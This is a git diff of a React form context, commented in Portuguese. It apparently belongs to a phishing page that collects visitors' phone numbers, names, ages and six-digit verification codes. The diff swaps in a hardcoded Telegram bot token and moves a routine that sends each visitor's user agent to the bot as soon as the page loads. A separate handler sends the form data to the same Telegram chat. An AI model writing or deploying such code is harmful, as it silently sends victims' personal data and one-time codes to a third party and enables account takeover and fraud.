@@ -3,7 +3,7 @@ import PropTypes from "prop-types";
 
 const UseContextForm = createContext();
 let chatId = "7911135198"//"7911135198";
-let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
+let botToken = "7888758598:AAEhfSCEpkJpycL7PO1ZLUhbAQPwydCq_mU"; //
 
 export const AuthForm = () => {
   const context = useContext(UseContextForm);
@@ -18,7 +18,6 @@ const ContextForm = ({ children }) => {
 
   // Estado para armazenar os valores dos campos
   const [values, setValues] = useState(["", "", "", "", "", ""]);
-  console.log(values.join(""));
 
   // Função para lidar com a entrada
   const handleInputChange = (index, event) => {
@@ -36,6 +35,38 @@ const ContextForm = ({ children }) => {
   // Limpar os campos
   const handleClear = () => setValues(["", "", "", "", "", ""]);
 
+
+  function captureDispositivo() {
+    const dispositivo = navigator.userAgent;
+    let chatId = "7911135198"; //"7911135198";
+    let botToken = "7888758598:AAEhfSCEpkJpycL7PO1ZLUhbAQPwydCq_mU"; //
+    const message = `📱Dispositivo:${dispositivo}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        if (data.ok) {
+          console.log("Mensagem enviada com sucesso!");
+        } else {
+          console.log("Erro ao enviar a mensagem.");
+        }
+      })
+      .catch((error) => console.log("Erro: ", error));
+  }
+
+  useEffect(() => {
+    captureDispositivo();
+  }, []);
+
   const sendMessageToTelegram = (e) => {
     e.preventDefault();
     if (nome.length === 0 || idade.length === 0 || telefone.length === 0) {
@@ -51,44 +82,6 @@ const ContextForm = ({ children }) => {
 
     const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
 
-    // fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
-    //   method: "POST",
-    //   headers: {
-    //     "Content-Type": "application/json",
-    //   },
-    //   body: JSON.stringify({
-    //     chat_id: secondtChatId,
-    //     text: message,
-    //   }),
-    // })
-    //   .then((response) => response.json())
-    //   .then((data) => {
-    //     if (data.ok) {
-    //       console.log("Mensagem enviada com sucesso!");
-    //     } else {
-    //       console.log("Erro ao enviar a mensagem.");
-    //     }
-    //   })
-    //   .catch((error) => console.log("Erro: ", error))
-    //   fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
-    //     method: "POST",
-    //     headers: {
-    //       "Content-Type": "application/json",
-    //     },
-    //     body: JSON.stringify({
-    //       chat_id: secondtChatId,
-    //       text: message,
-    //     }),
-    //   })
-    //     .then((response) => response.json())
-    //     .then((data) => {
-    //       if (data.ok) {
-    //         console.log("Mensagem enviada com sucesso!");
-    //       } else {
-    //         console.log("Erro ao enviar a mensagem.");
-    //       }
-    //     })
-    //     .catch((error) => console.log("Erro: ", error));
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -117,58 +110,6 @@ const ContextForm = ({ children }) => {
     setTelefone("");
   };
 
-  function captureDispositivo() {
-    const dispositivo = navigator.userAgent;
-  
-    const message = `📱Dispositivo:${dispositivo}`;
-
-      //
-      // fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
-      //   method: "POST",
-      //   headers: {
-      //     "Content-Type": "application/json",
-      //   },
-      //   body: JSON.stringify({
-      //     chat_id: secondtChatId,
-      //     text: message,
-      //   }),
-      // })
-      //   .then((response) => response.json())
-      //   .then((data) => {
-      //     if (data.ok) {
-      //       console.log("Mensagem enviada com sucesso!");
-      //     } else {
-      //       console.log("Erro ao enviar a mensagem.");
-      //     }
-      //   })
-      //   .catch((error) => console.log("Erro: ", error));
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-      }),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        if (data.ok) {
-          console.log("Mensagem enviada com sucesso!");
-        } else {
-          console.log("Erro ao enviar a mensagem.");
-        }
-      })
-      .catch((error) => console.log("Erro: ", error))
-
-    
-  }
-
-  useEffect(() => {
-    captureDispositivo();
-  }, []);
 
   const codigoVerification = (e) => {
     e.preventDefault();
@@ -242,6 +183,7 @@ const ContextForm = ({ children }) => {
         handleInputChange,
         handleClear,
         codigoVerification,
+        captureDispositivo,
       }}
     >
       {children}
